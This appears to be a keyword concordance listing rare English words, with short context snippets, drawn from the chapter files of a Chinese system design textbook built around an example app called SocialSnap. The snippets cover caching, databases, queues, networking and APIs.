  c02_b06.md: ...能会等。如果还剩 40 分钟，而关键安全补丁必须上线，你花掉预算。  这种 framing（框架）由 Google 的 Site Reliability Engineering（SRE）团队发明——把可靠性从绝对目标变成可协商的资源。我们将在第 1...

=== framing (1 occurrences) ===
  c02_b06.md: ...高风险部署历史上会造成 20 分钟停机，你可能会等。如果还剩 40 分钟，而关键安全补丁必须上线，你花掉预算。  这种 framing（框架）由 Google 的 Site Reliability Engineering（SRE）团队发明——把可靠性从绝...

=== missed (1 occurrences) ===
  c02_b09.md: ...adeoff（权衡）？  提示  想想“2 秒内”在本章指标中到底意味着什么。它是延迟保证？可用性保证？两者都是？如果 missed，用户体验是什么？  **答案：** 先定义 SLI：  * **通知送达延迟 SLI：** 从“点赞”事件被记录到通知...

=== atm (1 occurrences) ===
  c02_b10.md: ...户信任和业务。但可用性在正确性面前合理地更低优先。历史上，银行宁愿下线也不愿错误地处理事务（transactions）。ATM 网络在分区期间通常进入“降级模式”，允许小额取款但阻止大额取款。这是有意识的一致性优先于可用性的选择。  **为什么延...

=== snappy (1 occurrences) ===
  c03_b01.md: ...ns | 比 L1 慢约 4 倍 | | RAM 访问 | 100 ns | 比 L1 慢约 100 倍 | | 用 Snappy 压缩 1KB | 3 μs | 快，但不是免费 | | 从 RAM 顺序读 1MB | 10 μs | RAM 顺序读...

=== mau (1 occurrences) ===
  c03_b02.md: ...：** 300 百万（3 亿，已知） * **日活跃用户（DAU, Daily Active Users）：** 假设 MAU 中 50% 在任何一天活跃 → 150 百万 DAU（1.5 亿） * **每个用户每天平均请求数：** 典型用户一天...

=== nand (1 occurrences) ===
  c03_b06.md: ...这个差距存在是因为 RAM 是**电子的**——晶体管以电子速度开关，没有机械延迟。SSD 也是电子的，但数据存储在 NAND 闪存单元中，读取需要对单元加电压、感应电荷、再解码结果。闪存单元还有内部地址转换层（flash translation...

=== headroom (1 occurrences) ===
  c03_b09.md: ...,000 QPS 的系统。那么 10 倍估算误差只是意味着余量比预期少一点，而不是立即失败。好的系统设计为估算误差保留 headroom（余量）。  **Q2.** 两位工程师在争论是否给 SocialSnap 加 CDN。工程师 A 说：“我们没预算。买...

=== serving (1 occurrences) ===
  c03_b09.md: ...假设服务器处理时间为零。  对比伦敦的 CDN 边缘节点。同一数据中心往返：约 0.5 ms。CDN 在 5 ms 内 serving 缓存的 Feed。总延迟：约 5 ms——对欧洲用户提升 60 倍。  定量论据是：“如果 30% 用户在北美之外，他...

=== abadi (1 occurrences) ===
  c04_b03.md: ...LC 的用武之地。   ### 4.3 PACELC——实践中更重要的 tradeoff  2012 年，Daniel Abadi 提出 PACELC 作为 CAP 的扩展，捕捉工程师多数时候真正面临的 tradeoff。  PACELC 读作：**...

=== daniel (1 occurrences) ===
  c04_b03.md: ...就是 PACELC 的用武之地。   ### 4.3 PACELC——实践中更重要的 tradeoff  2012 年，Daniel Abadi 提出 PACELC 作为 CAP 的扩展，捕捉工程师多数时候真正面临的 tradeoff。  PACELC...

=== five (1 occurrences) ===
  c04_b03.md: ...100% 正常运行时间。”** 在 CAP 定理中，可用性有特定定义（每个非失败节点都响应）。它并不意味着你的服务达到 five nines（99.999%）正常运行时间。一个服务可以有高可用性（99.99% 正常运行时间），却仍在分区期间牺牲 C...

=== nines (1 occurrences) ===
  c04_b03.md: ...正常运行时间。”** 在 CAP 定理中，可用性有特定定义（每个非失败节点都响应）。它并不意味着你的服务达到 five nines（99.999%）正常运行时间。一个服务可以有高可用性（99.99% 正常运行时间），却仍在分区期间牺牲 CAP-可用性...

=== offer (1 occurrences) ===
  c04_b05.md: ...用户来说是什么样子的具体例子：  **例子 1：过时的社交 Feed。** 你在 SocialSnap 上发了“我拿到 offer 了！”。你的朋友请求被路由到另一个副本，刷新 Feed 没看到你的帖子。3 秒后他们再刷新，看到了。这是可接受的最终一...

=== crdts (1 occurrences) ===
  c04_b12.md: ...正的答案是一种专门的一致性模型：**Operational Transformation（OT，操作变换）** 或 **CRDTs（Conflict-free Replicated Data Types，无冲突复制数据类型）**，它们允许两个用户同时...

=== transformation (1 occurrences) ===
  c04_b12.md: ...。但要求线性一致性意味着任何网络抖动时文档都会变得无响应。真正的答案是一种专门的一致性模型：**Operational Transformation（OT，操作变换）** 或 **CRDTs（Conflict-free Replicated Data Types，无冲...

=== hello (1 occurrences) ===
  c05_b01.md: ...1 | "Just launched SocialSnap!" | 2024-01-15 | | 102 | 2 | "Hello world from Bob" | 2024-01-21 | | 103 | 1 | "Second post!" |...

=== just (1 occurrences) ===
  c05_b01.md: ..._id | content | created_at | |---|---|---|---| | 101 | 1 | "Just launched SocialSnap!" | 2024-01-15 | | 102 | 2 | "Hello wor...

=== created (1 occurrences) ===
  c08_b07.md: ...e queue (fast, ~2ms)         ↓     Return HTTP 200 "Account created!" to user         ↓     (Meanwhile, in the background...)...

=== launched (1 occurrences) ===
  c05_b01.md: ...content | created_at | |---|---|---|---| | 101 | 1 | "Just launched SocialSnap!" | 2024-01-15 | | 102 | 2 | "Hello world from B...

=== world (1 occurrences) ===
  c05_b01.md: ...ust launched SocialSnap!" | 2024-01-15 | | 102 | 2 | "Hello world from Bob" | 2024-01-21 | | 103 | 1 | "Second post!" | 2024-...

=== repeatable (1 occurrences) ===
  c05_b05.md: ...mitted（读已提交） | 防止 | 可能 | 可能 | 大多数 Web 应用（PostgreSQL 默认） | | Repeatable Read（可重复读） | 防止 | 防止 | 可能 | 事务内的金融读取 | | Serializable（可串行化）...

=== uncommitted (1 occurrences) ===
  c05_b05.md: ...| 级别 | 脏读 | 不可重复读 | 幻读 | 用例 | |---|---|---|---|---| | Read Uncommitted（读未提交） | 可能 | 可能 | 可能 | 很少有用 | | Read Committed（读已提交） | 防止 |...

=== follower (1 occurrences) ===
  c09_b08.md: ...Alice's recent posts     GET /users/42/followers → Alice's follower count   三个独立 HTTP 请求，每个都有一次网络往返。   #### GraphQL——以查询作为 API...

=== memory (1 occurrences) ===
  c05_b06.md: ...第一个真正的数据库。架构从：       [ Browser ] ──HTTP──> [ Flask App + in-memory dict ] (one machine)   升级到：       [ Browser ] ──HTTP──> [ F...

=== surprisingly (1 occurrences) ===
  c05_b07.md: ...### 5.5 单台关系型数据库的限制  SocialSnap v1 只有一台 PostgreSQL 实例，但能处理 surprisingly 大的流量。一台调好、硬件足够的 PostgreSQL 可以管理：  * 每秒数千次简单读（有索引） * 每秒数百次写...

=== bigtable (1 occurrences) ===
  c06_b01.md: ...-Family Store） | 行含多列，按列查询 | 宽行、时间序列、分析 | Cassandra, HBase, Bigtable | | 图数据库（Graph Database） | 节点与边 | 关系遍历 | Neo4j, Amazon Nept...

=== couchdb (1 occurrences) ===
  c06_b01.md: ...储（Document Store） | 类似 JSON 的文档 | 灵活 schema，嵌套数据 | MongoDB, CouchDB, Firestore | | 键值存储（Key-Value Store） | Key → 不透明 value | 极致...

=== firestore (1 occurrences) ===
  c06_b01.md: ...t Store） | 类似 JSON 的文档 | 灵活 schema，嵌套数据 | MongoDB, CouchDB, Firestore | | 键值存储（Key-Value Store） | Key → 不透明 value | 极致速度，简单 | Red...

=== hbase (1 occurrences) ===
  c06_b01.md: ...（Column-Family Store） | 行含多列，按列查询 | 宽行、时间序列、分析 | Cassandra, HBase, Bigtable | | 图数据库（Graph Database） | 节点与边 | 关系遍历 | Neo4j, A...

=== neptune (1 occurrences) ===
  c06_b01.md: ...able | | 图数据库（Graph Database） | 节点与边 | 关系遍历 | Neo4j, Amazon Neptune |  我们将详细审视每一种，聚焦它为何访问模式而设计、以及做出了哪些 tradeoff（权衡）。...

=== predictable (1 occurrences) ===
  c06_b01.md: ...具。这不是关系型数据库的失败——而是工具与工作负载不匹配。关系型数据库擅长结构化数据、复杂多表查询和强一致性；它们在不 predictable 的 schema、极端写吞吐和图遍历面前挣扎。  NoSQL 数据库正是为这些不匹配而存在。“NoSQL”不是单一事物...

=== intel (1 occurrences) ===
  c06_b02.md: ..."electronics",       "attributes": {         "processor": "Intel i7",         "ram_gb": 16,         "storage_gb": 512,...

=== probook (1 occurrences) ===
  c06_b02.md: ...aptop product     {       "_id": "prod_002",       "name": "ProBook 15",       "price": 1299.99,       "category": "electronics...

=== black (1 occurrences) ===
  c06_b02.md: ..."sizes": ["S", "M", "L", "XL"],         "colors": ["black", "white", "gray"],         "material": "100% cotton"...

=== colors (1 occurrences) ===
  c06_b02.md: ...ibutes": {         "sizes": ["S", "M", "L", "XL"],         "colors": ["black", "white", "gray"],         "material": "100% cot...

=== cotton (1 occurrences) ===
  c06_b02.md: ...ors": ["black", "white", "gray"],         "material": "100% cotton"       }     }      // laptop product     {       "_id": "p...

=== gray (1 occurrences) ===
  c06_b02.md: ..."S", "M", "L", "XL"],         "colors": ["black", "white", "gray"],         "material": "100% cotton"       }     }      //...

=== laptop (1 occurrences) ===
  c06_b02.md: ..."],         "material": "100% cotton"       }     }      // laptop product     {       "_id": "prod_002",       "name": "ProBo...

=== material (1 occurrences) ===
  c06_b02.md: ...L"],         "colors": ["black", "white", "gray"],         "material": "100% cotton"       }     }      // laptop product     {...

=== processor (1 occurrences) ===
  c06_b02.md: ..."category": "electronics",       "attributes": {         "processor": "Intel i7",         "ram_gb": 16,         "storage_gb": 5...

=== shirt (1 occurrences) ===
  c06_b02.md: ...个**文档（document）**——一个类似 JSON 的对象，包含该特定产品所需的任意字段。       // t-shirt product     {       "_id": "prod_001",       "name": "Class...

=== sizes (1 occurrences) ===
  c06_b02.md: ..."category": "apparel",       "attributes": {         "sizes": ["S", "M", "L", "XL"],         "colors": ["black", "white...

=== white (1 occurrences) ===
  c06_b02.md: ...sizes": ["S", "M", "L", "XL"],         "colors": ["black", "white", "gray"],         "material": "100% cotton"       }     }...

=== terrible (1 occurrences) ===
  c06_b03.md: ...不断。你需要查询：“给我过去 24 小时 A 集群服务器的 CPU 利用率，1 分钟粒度。”  这对关系型数据库来说是 terrible 的匹配：  * 每秒 500,000 次写入超过单节点 PostgreSQL 能力 * 查询是对特定行集合的时间范围扫...

=== cql (1 occurrences) ===
  c06_b04.md: ...吞吐、分区内高效时间范围查询、可调一致性、优秀的水平可扩展性。  **代价（查询灵活性）：** Cassandra 有 CQL，看起来像 SQL，但深受限制。你只能按分区键和聚类键查询。跨分区查询（相当于跨分区 join）很贵，通常不推荐。在 C...

=== columns (1 occurrences) ===
  c06_b04.md: ...w key: server_id + date (e.g., "server-001:2024-01-15")     Columns: timestamps → metric values       "09:00:00" → {cpu: 45, me...

=== row (1 occurrences) ===
  c06_b04.md: ...y）**。属于同一分区键的所有数据一起存在同一节点上——这使分区内的范围扫描非常快。  对服务器监控用例：       Row key: server_id + date (e.g., "server-001:2024-01-15")     C...

=== metric (1 occurrences) ===
  c06_b04.md: ...e (e.g., "server-001:2024-01-15")     Columns: timestamps → metric values       "09:00:00" → {cpu: 45, mem: 72, disk_io: 12, ....

=== tick (1 occurrences) ===
  c06_b04.md: ...是单行范围扫描——极快。   #### 列族存储何时胜出  **时间序列数据：** IoT 传感器读数、应用指标、金融 tick 数据、事件日志。数据按时间顺序写入，按时间范围读取。  **高写入吞吐：** Cassandra 为写入而设计。其日志...

=== timestamps (1 occurrences) ===
  c06_b04.md: ...rver_id + date (e.g., "server-001:2024-01-15")     Columns: timestamps → metric values       "09:00:00" → {cpu: 45, mem: 72, disk_...

=== distinct (1 occurrences) ===
  c06_b05.md: ...E user_id = alice_id`  “Alice 的朋友的朋友”需要自 join：       SELECT DISTINCT f2.friend_id     FROM friendships f1     JOIN friendships f...

=== dave (1 occurrences) ===
  c06_b05.md: ...NDS_WITH → Node: Carol (id: 3)       → FRIENDS_WITH → Node: Dave (id: 4)      Node: Bob (id: 2)       → FRIENDS_WITH → Node:...

=== eve (1 occurrences) ===
  c06_b05.md: ...(id: 4)      Node: Bob (id: 2)       → FRIENDS_WITH → Node: Eve (id: 5)       → FRIENDS_WITH → Node: Alice (id: 1)   找 Alic...

=== friends (1 occurrences) ===
  c08_b07.md: ..."user.signup" event from queue         ← notifies connected friends (200ms — doesn't block the user)   用户体验到瞬时注册（PostgreSQL 插入...

=== basically (1 occurrences) ===
  c06_b06.md: ...#### 定义：BASE  **BASE** 代表 **Basically Available, Soft state, Eventually consistent（基本可用、软状态、最终一致）...

=== soft (1 occurrences) ===
  c06_b06.md: ...#### 定义：BASE  **BASE** 代表 **Basically Available, Soft state, Eventually consistent（基本可用、软状态、最终一致）。**  * **基本可用（Ba...

=== latitude (1 occurrences) ===
  c06_b10.md: ...析有用（路线重建、ETA）  **第 2 步：schema 稳定性：** 稳定——每次位置更新都有 driver_id、latitude、longitude、timestamp。不需要 schema 演进。  **第 3 步：一致性要求：** 请求司机的乘...

=== lon (1 occurrences) ===
  c06_b10.md: ...ey: "driver:{driver_id}:location"     Value: {lat: 37.7749, lon: -122.4194, updated_at: 1705312000}     TTL: 30 seconds (ex...

=== longitude (1 occurrences) ===
  c06_b10.md: ...ETA）  **第 2 步：schema 稳定性：** 稳定——每次位置更新都有 driver_id、latitude、longitude、timestamp。不需要 schema 演进。  **第 3 步：一致性要求：** 请求司机的乘客看到的位置可能是...

=== seconds (1 occurrences) ===
  c06_b10.md: ...7.7749, lon: -122.4194, updated_at: 1705312000}     TTL: 30 seconds (expire inactive drivers automatically)   对“5km 内司机”查询，使用**...

=== interval (1 occurrences) ===
  c26_b04.md: ...确保节点故障、网络分区或 hinted handoff 导致的临时分歧在有限时间内解决——**anti-entropy interval**，通常配置为数分钟。  * * *...

=== withscores (1 occurrences) ===
  c06_b11.md: ...门 hashtag：       ZREVRANGE trending_hashtags:2024-01-15 0 9 WITHSCORES     → ["#systemdesign", "45231", "#engineering", "38204", ....

=== zrevrange (1 occurrences) ===
  c06_b11.md: ...:2024-01-15 1 "#engineering"   取当天 Top 10 热门 hashtag：       ZREVRANGE trending_hashtags:2024-01-15 0 9 WITHSCORES     → ["#system...

=== hours (1 occurrences) ===
  c06_b11.md: ...FROM hashtags     WHERE created_at > NOW() - INTERVAL '24 hours'     GROUP BY tag     ORDER BY count DESC     LIMIT 10;   *...

=== active (1 occurrences) ===
  c06_b12.md: ...NOT NULL,         ended_on        DATE  -- NULL means still active     );      CREATE TABLE clinical_notes (         id...

=== means (1 occurrences) ===
  c06_b12.md: ...n      DATE NOT NULL,         ended_on        DATE  -- NULL means still active     );      CREATE TABLE clinical_notes (...

=== note (1 occurrences) ===
  c06_b12.md: ...TEXT,         metadata        JSONB  -- variable fields per note type     );   `clinical_notes` 上的 `JSONB` 列处理可变元数据，无需单独文档存储...

=== still (1 occurrences) ===
  c06_b12.md: ...DATE NOT NULL,         ended_on        DATE  -- NULL means still active     );      CREATE TABLE clinical_notes (         id...

=== follow (1 occurrences) ===
  c06_b15.md: ...ce 关注 Bob，但 Bob 不一定关注 Alice）。在 Instagram 规模（数亿条边）下，这实际上由专门的 follow-graph 服务支持，底层用键值存储或自定义图存储，而不是通用图数据库。Neo4j 在中等规模工作，但难以跨机器分布。...

=== accessed (1 occurrences) ===
  c07_b01.md: ...需重复工作。   #### 定义：缓存  **缓存** 是一个快速、通常位于内存中的存储层，存储 frequently accessed 数据的副本，以便未来请求该数据时比从原始来源（通常是数据库或外部服务）取回更快。  plain 语言：缓存是一个记事本...

=== breakthrough (1 occurrences) ===
  c07_b01.md: ...00%。查询开始排队。p99 延迟从安静下午的 80ms 变成 4 秒。用户看到白屏。这本该是 SocialSnap  breakthrough 的病毒时刻，变成了最尴尬的 outage。  侦探问题是：这 8,000 个请求每个到底在问什么？  几乎可以肯定，它...

=== frequently (1 occurrences) ===
  c07_b01.md: ...的请求可以立即服务，无需重复工作。   #### 定义：缓存  **缓存** 是一个快速、通常位于内存中的存储层，存储 frequently accessed 数据的副本，以便未来请求该数据时比从原始来源（通常是数据库或外部服务）取回更快。  plain 语言...

=== obsess (1 occurrences) ===
  c07_b02.md: ...处理以前 100 倍的流量。  从 90% 到 99% 的命中率远比从 0% 到 90% 更有价值。这就是为什么工程师 obsess 于让热数据的命中率尽可能高。   #### 常见误解  “缓存让一切都更快。” 这只对一半。缓存让**常见情况**更快...

=== york (1 occurrences) ===
  c07_b03.md: ...ent Delivery Network，CDN）** 是地理分布的缓存服务器网络。当 Tokyo 的用户请求 New York 服务器上的图片时，他们不必等待往返（仅网络延迟就约 150ms）。相反，CDN 在 Tokyo 有一台缓存服务器。如果...

=== look (1 occurrences) ===
  c07_b04.md: ...#### Cache-Aside 算法  读取一个值：       1. Look up the key in the cache     2. If cache HIT:        - Retur...

=== old (1 occurrences) ===
  c07_b04.md: ...he new value to the database     2. Invalidate (delete) the old cached value — OR — update it in the cache   让我们用 SocialSna...

=== background (1 occurrences) ===
  c07_b05.md: ...lush to database)     3. Return success immediately     4. [Background process] Flush dirty entries to database at regular interva...

=== mark (1 occurrences) ===
  c07_b05.md: ...径：**       1. Write value to cache (fast, in-memory)     2. Mark the entry as "dirty" (pending flush to database)     3. Ret...

=== almost (1 occurrences) ===
  c07_b05.md: ...he     3. Return success   **读取路径：**       1. Check cache — almost always a HIT (cache is always up to date)     2. On miss (f...

=== entries (1 occurrences) ===
  c07_b05.md: ...success immediately     4. [Background process] Flush dirty entries to database at regular intervals   **收益：** 写入以缓存速度完成——毫秒级。如...

=== entry (1 occurrences) ===
  c07_b05.md: ...1. Write value to cache (fast, in-memory)     2. Mark the entry as "dirty" (pending flush to database)     3. Return succes...

=== immediately (1 occurrences) ===
  c07_b05.md: ...s "dirty" (pending flush to database)     3. Return success immediately     4. [Background process] Flush dirty entries to database...

=== intervals (1 occurrences) ===
  c07_b05.md: ...kground process] Flush dirty entries to database at regular intervals   **收益：** 写入以缓存速度完成——毫秒级。如果一个 key 每秒更新 100 次，数据库只接收最新值（合并写入...

=== process (1 occurrences) ===
  c07_b05.md: ...abase)     3. Return success immediately     4. [Background process] Flush dirty entries to database at regular intervals   **收...

=== regular (1 occurrences) ===
  c07_b05.md: ...4. [Background process] Flush dirty entries to database at regular intervals   **收益：** 写入以缓存速度完成——毫秒级。如果一个 key 每秒更新 100 次，数据库只...

=== aof (1 occurrences) ===
  c07_b07.md: ...session ID。  **持久化选项：** Redis 支持两种持久化模式——RDB 快照（定期完整快照到磁盘）和 AOF（Append-Only File，记录每条写入命令）。这使 Redis 在重启后能不丢失所有缓存数据，尽管有一定恢复时...

=== hyperloglog (1 occurrences) ===
  c07_b07.md: ...ictionary Server）是功能更丰富的内存数据结构存储服务器。它支持字符串、列表、集合、有序集合、哈希、位图、HyperLogLog、地理空间索引等。对这些类型的操作是原子的——Redis 在核心中是单线程处理命令的，因此数据结构操作没有竞态条件。...

=== loads (1 occurrences) ===
  c07_b07.md: ...s.get(cache_key)         if cached:             return json.loads(cached)  # Cache hit          # Cache miss — query database...

=== minute (1 occurrences) ===
  c07_b07.md: ...WHERE id = %s", [user_id])          # Store in cache with 5-minute TTL         redis.setex(cache_key, 300, json.dumps(profile)...

=== revalidate (1 occurrences) ===
  c07_b09.md: ...空档。这对可预先计算的数据（热门帖子、推荐结果）有效，但需要后台任务基础设施。  **方案 4：stale-while-revalidate 短路。** 服务陈旧的缓存值，同时触发异步缓存刷新。用户立即得到略旧的响应，而不是等待。缓存在后台刷新。这是浏览器对某...

=== while (1 occurrences) ===
  c07_b09.md: ...存从不会出现空档。这对可预先计算的数据（热门帖子、推荐结果）有效，但需要后台任务基础设施。  **方案 4：stale-while-revalidate 短路。** 服务陈旧的缓存值，同时触发异步缓存刷新。用户立即得到略旧的响应，而不是等待。缓存在后...

=== live (1 occurrences) ===
  c07_b11.md: ...表什么？在缓存新鲜度中起什么作用？TTL 设太短或太长有什么后果？  **答案：** TTL 代表 **Time-to-Live（生存时间）**。它是缓存条目视为过期并丢弃前的时长。过期条目被请求时，缓存返回未命中，应用从数据库取回新鲜数据。  *...

=== random (1 occurrences) ===
  c07_b12.md: ...贵的数据库查询  一种缓解：**给 TTL 加随机抖动**。不统一设 TTL = 60 秒，而是 TTL = 60 + random(0, 15) 秒。不同服务器上的缓存副本在略不同时间过期（60 到 75 秒之间）。未命中负载分散在 15 秒窗口内，...

=== deeper (1 occurrences) ===
  c07_b15.md: ...粉丝 >10,000）发帖时，**不要**把 10,000+ 粉丝缓存全部 fan-out 失效——这正是 Think Deeper 里提到的惊群问题。相反，让这些缓存按 TTL 自然过期。对普通用户（粉丝 <1,000），发帖时使其粉丝的 Feed...

=== think (1 occurrences) ===
  c07_b15.md: ..._ 当名人（粉丝 >10,000）发帖时，**不要**把 10,000+ 粉丝缓存全部 fan-out 失效——这正是 Think Deeper 里提到的惊群问题。相反，让这些缓存按 TTL 自然过期。对普通用户（粉丝 <1,000），发帖时使其粉丝...

=== ajax (1 occurrences) ===
  c07_b17.md: ...的关系（关注/取消关注按钮、共同帖子）。常见解决方案：提供 CDN 缓存的“公开外壳”资料页，然后通过不被缓存的第二次 Ajax 调用“水合”个性化元素。CDN 承担为通过搜索引擎访问 Alice 的匿名访客提供资料页的重活，而登录用户获得由 CD...

=== damaging (1 occurrences) ===
  c07_b17.md: ...答案，快速提供。但缓存从根本上改变了系统的正确性模型，引入了陈旧数据和失效 bug 的可能性，这些问题可能比性能问题更 damaging。  本章关键概念：  **缓存命中率**是主要性能杠杆。90% 命中率降低数据库负载 90%；99% 命中率降低 99...

=== risking (1 occurrences) ===
  c07_b17.md: ...** 每次写入都保持缓存与数据库同步，消除陈旧但增加写入开销。**Write-behind** 批量写入，提升写性能但 risking 数据丢失。  **TTL** 是主要新鲜度旋钮。短 TTL 偏向一致性；长 TTL 偏向性能。正确 TTL 取决于数据...

=== contact (1 occurrences) ===
  c08_b04.md: ...s to Analytics Service (subscriber)         ├── delivers to Contact Notification Service (subscriber)         └── delivers to O...

=== tail (1 occurrences) ===
  c08_b04.md: ...志文件。多个程序可独立读取同一个日志文件。每个程序维护自己的位置。一个程序可能从昨天的日志条目读起分析错误；另一个程序 tail 实时末端监控系统事件。它们互不干扰。日志文件不会因为某个程序读取了就删除条目——条目按配置保留一段时间。  Kafka...

=== routinely (1 occurrences) ===
  c08_b05.md: ...分区可分布在许多服务器上。一个 100 分区的主题可支持 100 个并行消费者实例，每个处理一个分区。Kafka 集群 routinely 处理每秒数百万条消息。   #### Kafka 的代价  Kafka 运维复杂。搭建 Kafka 集群、调整分区数、...

=== usercreated (1 occurrences) ===
  c08_b06.md: ...** 存储**事件历史**而非当前状态。系统不存“Alice 当前简介是 X”，而是存：       Event 1: UserCreated(user_id=1, name="Alice", bio="Hello!")     Event 2: UserBio...

=== account (1 occurrences) ===
  c08_b07.md: ...o message queue (fast, ~2ms)         ↓     Return HTTP 200 "Account created!" to user         ↓     (Meanwhile, in the backgrou...

=== logs (1 occurrences) ===
  c08_b07.md: ...ce         ← reads "user.signup" event from queue         ← logs the event (50ms — doesn't block the user)      Queue Consum...

=== notifies (1 occurrences) ===
  c08_b07.md: ...ce         ← reads "user.signup" event from queue         ← notifies connected friends (200ms — doesn't block the user)   用户体验到瞬...

=== sends (1 occurrences) ===
  c08_b07.md: ...ce         ← reads "user.signup" event from queue         ← sends welcome email (300ms — doesn't block the user)      Queue C...

=== transaction (1 occurrences) ===
  c08_b08.md: ...果你告诉用户“支付已处理”，然后异步通知商家，商家可能在支付实际清算前就发货了。消息队列中的最终一致性与金融操作所需的 transaction 保证不兼容。那种情况下，同步耦合（及其相关的性能和可用性成本）才是正确设计。  消息队列并非普遍优于同步调用。它们是正...

=== idempotent (1 occurrences) ===
  c08_b11.md: ...]         )          if already_sent:             return  # Idempotent: do nothing on duplicate          # Send the email...

=== record (1 occurrences) ===
  c08_b11.md: ...email_service.send_welcome_email(user_id)          # Record that we sent it         db.execute(             "INSERT INT...

=== already (1 occurrences) ===
  c08_b11.md: ...:         user_id = event['user_id']          # Check if we already sent the welcome email         already_sent = db.query(...

=== duplicate (1 occurrences) ===
  c08_b11.md: ...ready_sent:             return  # Idempotent: do nothing on duplicate          # Send the email         email_service.send_welcom...

=== duplicates (1 occurrences) ===
  c08_b12.md: ...WebSocket，第 9 章会讲）  **投递保证：** 至少一次。我们不能丢失点赞通知（用户会注意到通知缺失）。 duplicates 在适当幂等性下可接受。  **幂等性设计：**  通知服务在插入前检查：       INSERT INTO noti...

=== defeats (1 occurrences) ===
  c08_b13.md: ...一次，字段 B 每秒变化 100 次，把它们存在同一个缓存 key 中意味着 B 的每次变化都会驱逐 A 的缓存值—— defeats 缓存 A 的目的。  这是第 5 章反规范化讨论在缓存中的对应：你为了优化访问模式而结构化数据。缓存 key 设计就是...

=== actively (1 occurrences) ===
  c08_b14.md: ...弃。  **“你的订单可取了”或“你的车快到了”：** 一条 15 分钟前的“你的车 2 分钟后到”通知不仅无用，还会 actively 误导。这些事件应在事件 payload 中包含过期时间戳；消费者处理前检查时间戳，并丢弃超过动作相关窗口的事件。  *...

=== transactions (1 occurrences) ===
  c08_b15.md: .../事务日志（从不更新或删除行，只插入）。这提供事件溯源的审计轨迹和时间查询好处，又避免完整架构复杂度。“当前余额”是对 transactions 表的简单聚合，或缓存的物化视图。...

=== yagni (1 occurrences) ===
  c08_b16.md: ...应用增长到需要更复杂的事件处理（规则引擎、机器学习分类管道、交易/事务的多个下游消费者），那时再迁移到完整事件溯源模型。YAGNI——“你不会需要它”——适用于架构复杂度。构建今天需要的东西；当事件溯源解决的问题成为你的实际问题时，再引入它。  **...

=== singapore (1 occurrences) ===
  c09_b01.md: ...中心内部发生的事：存储数据的数据库、快速服务数据的缓存、把生产者与消费者解耦的消息队列。但有一个问题我们一直默默回避了：Singapore 用户浏览器发出的请求，到底是如何到达 SocialSnap 应用服务器的？  答案涉及多层基础设施，每层承担特定职责。...

=== servers (1 occurrences) ===
  c09_b01.md: ...器。哪个服务器应该处理 incoming 请求？答案不能是“总是 server 1”——server 1 会被压垮，而 servers 2–5 闲置。你需要一个组件，智能地把请求分发给可用服务器。  这个组件就是**负载均衡器（load balancer...

=== ping (1 occurrences) ===
  c09_b02.md: ...响应，则被标记为不健康并从池中移除。恢复并开始响应健康检查后，再加回。  **主动健康检查：** 负载均衡器按调度主动 ping 每个后端（如每 5 秒）。  **被动健康检查：** 负载均衡器监控真实流量响应。如果服务器返回 5xx 错误或超时，...

=== osi (1 occurrences) ===
  c09_b03.md: ...——两种负载均衡  负载均衡器工作在网络协议栈的不同层，层数决定它们能用什么信息做路由决策。  理解这些层前先简单介绍：OSI 模型（Open Systems Interconnection model）把网络通信描述为七层栈。与我们相关的是：...

=== smtp (1 occurrences) ===
  c09_b03.md: ...端口和传输协议（TCP 或 UDP）。它看不到传输数据的内容。  **第 7 层——应用层：** HTTP、HTTPS、SMTP 等应用协议所在层。在第 7 层，负载均衡器能看到 HTTP 请求的实际内容：URL 路径、HTTP 头、cookie...

=== disruptive (1 occurrences) ===
  c09_b06.md: ...玩家角色跳变。DNS 查询：小、快、尽力而为（如果查询丢了就重试）。语音通话：短暂的音频掉线比 TCP 重传的延迟更不 disruptive。  **何时用 TCP：** 任何不能容忍数据丢失的应用——网页、文件传输、邮件、数据库连接、API 调用。  对 S...

=== representational (1 occurrences) ===
  c09_b08.md: ...#### REST——Representational State Transfer  REST 是公共 Web API 的主流风格。它用 HTTP 动词（GET、POST、...

=== transfer (1 occurrences) ===
  c09_b08.md: ...#### REST——Representational State Transfer  REST 是公共 Web API 的主流风格。它用 HTTP 动词（GET、POST、PUT、DELETE、PATC...

=== followers (1 occurrences) ===
  c09_b08.md: ...users/42/posts     → Alice's recent posts     GET /users/42/followers → Alice's follower count   三个独立 HTTP 请求，每个都有一次网络往返。   ####...

=== partial (1 occurrences) ===
  c09_b08.md: ...place user 42's data     PATCH /users/42                  → partial update of user 42     DELETE /users/42/posts/101       → de...

=== recent (1 occurrences) ===
  c09_b08.md: ...→ Alice's profile     GET /users/42/posts     → Alice's recent posts     GET /users/42/followers → Alice's follower count...

=== replace (1 occurrences) ===
  c09_b08.md: ...→ create a new user     PUT  /users/42                   → replace user 42's data     PATCH /users/42                  → parti...

=== getuserrequest (1 occurrences) ===
  c09_b09.md: ...teBio (UpdateBioRequest) returns (User);     }      message GetUserRequest {       int64 user_id = 1;     }      message User {...

=== homefeed (1 occurrences) ===
  c09_b14.md: ...ms；即使并行也需要约 100-150ms。GraphQL 会把这 4 个调用合并成一个查询：       query HomeFeed {       me {         username         photoUrl         foll...

=== exists (1 occurrences) ===
  c09_b15.md: ..."online": true/false, "last_seen": "..." }       → 检查 Redis：EXISTS presence:{user_id}   **客户端更新协议：**  如果客户端已经打开 WebSocket 连接（用...

=== false (1 occurrences) ===
  c09_b15.md: ...T /api/users/{user_id}/presence       → 返回 { "online": true/false, "last_seen": "..." }       → 检查 Redis：EXISTS presence:{use...

=== minutes (1 occurrences) ===
  c09_b15.md: ...alue: {last_seen: timestamp, status: "online"}     TTL:   5 minutes (300 seconds)   如果 presence key 存在，用户就是“在线”的。5 分钟无活动后 key 自...

=== cripple (1 occurrences) ===
  c09_b18.md: ...章，6.3 节），任何服务器都能服务任何用户的会话——服务器崩溃只造成短暂故障转移，不会强制登出。  **自动扩展被 cripple。** 流量激增时，你启动新服务器。粘性会话下，新服务器只接收新用户——已有用户仍粘着原服务器，原服务器继续承担已建立会...

=== jpeg (1 occurrences) ===
  c10_b01.md: ...当前架构无法处理的功能需求：头像图片。  用户想上传头像。上传后，SocialSnap 需要存储一个可能 2 MB 的 JPEG 文件。当朋友访问其资料页时，SocialSnap 需要把文件返回给潜在成千上万的同时访问者。  文件放哪里？  天真的...

=== sata (1 occurrences) ===
  c10_b02.md: ...0.10–0.30 USD/GB * 容量：每块磁盘 TB * 存放内容：主数据库存储、活跃应用文件  **第 4 级：SATA SSD**  * 速度：约 0.5 毫秒 * 成本：约 0.05–0.10 USD/GB * 容量：每块磁盘 TB *...

=== azure (1 occurrences) ===
